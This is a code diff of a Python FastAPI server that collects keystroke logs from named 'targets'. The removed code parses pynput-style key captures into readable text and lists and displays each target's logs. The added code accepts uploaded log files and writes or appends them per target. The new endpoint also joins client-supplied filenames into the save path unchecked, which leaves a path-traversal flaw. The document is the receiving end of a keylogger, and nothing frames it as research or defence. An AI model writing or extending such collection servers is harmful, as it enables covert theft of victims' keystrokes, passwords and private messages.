@@ -1,6 +1,4 @@
-from fastapi import FastAPI, HTTPException
-from fastapi.responses import HTMLResponse
-from pydantic import BaseModel
+from fastapi import FastAPI, File, UploadFile, HTTPException
 import os
 
 app = FastAPI()
@@ -13,60 +11,44 @@ MAX_SIZE = 10 * 1024 * 1024  # 10MB per log file
 if not os.path.exists(SAVE_DIR):
     os.makedirs(SAVE_DIR)
 
-# Pydantic model to handle incoming log data
-class LogData(BaseModel):
-    logs: str
-    user_name: str  # User name (or target name)
 
-# Utility function to parse raw key logs
-def parse_logs(raw_logs: str) -> str:
-    key_mapping = {
-        "Key.space": " ",
-        "Key.enter": "[ENTER]",
-        "Key.tab": "[TAB]",
-        "Key.backspace": "[BACKSPACE]",
-        "Key.ctrl_l": "[CTRL]",
-        "Key.shift": "[SHIFT]",
-        "Key.alt_l": "[ALT]",
-        "Key.right": "[RIGHT]",
-        "Key.left": "[LEFT]",
-    }
+@app.post("/logs")
+async def upload_log(file: UploadFile = File(...)):
+    try:
+        # Get target name from file
+        target_name = file.filename
+        
+        if not target_name:
+            raise HTTPException(status_code=400, detail="Invalid file name")
+        
+        # Determine target file path
+        target_file_path = os.path.join(SAVE_DIR, target_name)
+        
+        # Read uploaded file data
+        data = await file.read()
 
-    readable_logs = []
-    for log in raw_logs.splitlines():
-        if log in key_mapping:
-            readable_logs.append(key_mapping[log])
+        if len(data) == 0:
+            raise HTTPException(status_code=400, detail="Empty file uploaded")
+
+        # Check if the file already exists
+        if os.path.exists(target_file_path):
+            # Check if size exceeds limit
+            if os.path.getsize(target_file_path) > MAX_SIZE:
+                raise HTTPException(status_code=400, detail="Target file size exceeded")
+            
+            # Append data to the existing file
+            with open(target_file_path, "ab") as f:
+                f.write(data)
+            return {"status": "success", "message": f"Appended data to {target_name}"}
         else:
-            readable_logs.append(log.strip("'"))  # Remove single quotes for characters
-
-    return "".join(readable_logs)
-
-@app.get("/targets")
-async def get_targets():
-    """Returns a list of all available target log files."""
-    try:
-        targets = [f.split(".")[0] for f in os.listdir(SAVE_DIR) if f.endswith(".txt")]
-        return {"targets": targets}
+            # Create a new target file and write data
+            with open(target_file_path, "wb") as f:
+                f.write(data)
+            return {"status": "success", "message": f"Created new target {target_name} and added data"}
     except Exception as e:
-        raise HTTPException(status_code=500, detail="Error retrieving targets")
+        raise HTTPException(status_code=500, detail=str(e))
 
-@app.get("/logs/{target_name}")
-async def get_logs(target_name: str):
-    """Returns the parsed logs for a specific target."""
-    user_file = os.path.join(SAVE_DIR, f"{target_name}.txt")
-    if not os.path.exists(user_file):
-        raise HTTPException(status_code=404, detail="Log file not found")
 
-    try:
-        with open(user_file, "r") as f:
-            raw_logs = f.read()
-        parsed_logs = parse_logs(raw_logs)
-        return {"target_name": target_name, "logs": parsed_logs}
-    except Exception as e:
-        raise HTTPException(status_code=500, detail="Error reading log file")
-
-@app.get("/")
-async def main():
-    """Serves the HTML page."""
-    with open("index.html", "r") as f:
-        return HTMLResponse(f.read())
+if __name__ == "__main__":
+    import uvicorn
+    uvicorn.run(app, port=5000)  # Port set to 5000
